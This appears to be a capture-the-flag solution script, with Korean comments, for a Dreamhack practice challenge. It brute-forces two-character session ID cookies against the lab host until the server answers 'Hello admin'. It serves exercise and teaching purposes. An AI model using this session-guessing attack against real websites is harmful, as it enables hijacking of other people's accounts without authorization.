'''
solution..!
- os.urandom(1).hex()를 찍어보면 2자리 랜덤 숫자+영소문자를 세션에다가 저장해놨음
- 반복해서 요청하는 것에 대한 보안 조치가 없으므로 브루투포스 공격
- 하나씩 반복문 돌려서 찍기
'''
import requests


# 세션활성화
s = requests.Session()

# 나올 수 있는 랜덤한 변수 문자열
rnd = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']

# 최대 두자리니까 하나씩 랜덤하게 돌리기 ??
# 0~9a-z
for i in rnd :
    for j in rnd :
        rnd_val = i + j
        r = s.get("http://host3.dreamhack.games:16017/", cookies={'sessionid' : rnd_val})
        if "Hello admin" in r.text :
            print("found it!!")
            print(r.text)
            break
